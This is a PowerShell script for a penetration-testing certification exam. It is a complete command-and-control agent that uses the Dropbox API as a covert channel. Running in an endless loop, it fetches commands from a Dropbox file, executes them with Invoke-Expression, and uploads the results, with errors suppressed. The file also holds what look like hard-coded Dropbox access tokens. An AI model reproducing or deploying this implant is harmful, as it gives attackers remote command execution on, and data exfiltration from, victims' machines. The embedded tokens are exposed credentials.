function Dropbox-Agent
{
    <#

    .SYNOPSIS
    This PowerShell script is an intractive shell that uses Dropbox to exfilrate data.
    .DESCRIPTION
    This is the agent function that run on target machine, you need to run Dropbox-c2 on attacker machine.
 
     .PARAMTER Token
    It expects an access token of your Dropbox account, Or you could change the token inside the code.
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/

    .EXAMPLE
    PS C:\> . .\Dropbox-Agent.ps1
    PS C:\> Dropbox-Agent
    PS C:\> Dropbox-Agent -Token "oea-uClDJ0AAAAAAAAAAC6Q8S94-xHeBb2-hLr_6oH_LruhhuuFJ1mrb6PnQMrXJ"

    .LINK
    https://blogs.dropbox.com/developers/2014/05/generate-an-access-token-for-your-own-account/
    https://www.dropbox.com/developers/documentation/http/documentation#files-download

    .NOTES
    This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam.
    " http://www.securitytube-training.com/online-courses/powershell-for-pentesters/ "
    Student ID: PSP - 3224
    #>

    [CmdletBinding(SupportsShouldProcess = $true)]
    param (

    [parameter (Mandatory = $false)]
    [string]
    $Token = "oea-uClDJ0AAAAAAAAAAC7Q8S94-xHeBb2-hLr_9oH_LruhhuuFJ1mrb1PnQMrXJ"

    )


    $HeaderUP= @{
        "Dropbox-API-Arg"='{"path": "/output.txt","mode": "overwrite","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    } 

     $HeaderDown= @{
        "Authorization"="Bearer $Token"
		"Dropbox-API-Arg"='{"path": "/command.txt"}'
        "Content-Type"="application/octet-stream"
    }

     $HeaderUPStatus= @{
        "Dropbox-API-Arg"='{"path": "/status.txt","mode": "overwrite","autorename": true,"mute": false,"strict_conflict": false}'
        "Authorization"="Bearer $Token"
        "Content-Type"="application/octet-stream"
    }

     $HeaderDownStatus= @{
        "Authorization"="Bearer $Token"
		"Dropbox-API-Arg"='{"path": "/status.txt"}'
        "Content-Type"="application/octet-stream"
    }

    $ErrorActionPreference = 'SilentlyContinue'
    try {
        #Create status file
        $upstat = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body "Agent Activated" -Headers $HeaderUPStatus
  
        while ($true)
        {
            Start-Sleep -s 5

            #checking status
            $request_permission = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -Headers $HeaderDownStatus

            if ($request_permission -eq 'Wating for output'){

                #download command
                $getcommand = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/download -Method Post -Headers $HeaderDown
               
                if ($getcommand){

                    #execute command
                    $cmdoutput = Invoke-Expression -Command $getcommand
                    Write-Output "command: $cmdoutput "                   
                    #upload output
                    $upout = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body $cmdoutput -Headers $HeaderUP

                    #upload new status
                    $upstat = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body "Output is ready" -Headers $HeaderUPStatus
                    }          
                 }
             }
    }

    catch {
         [System.Management.Automation.CommandNotFoundException]
         $upout = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body "Agent down" -Headers $HeaderUP
         #upload new status
         $upstats = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Body "Output is ready" -Headers $HeaderUPStatus
          }

}

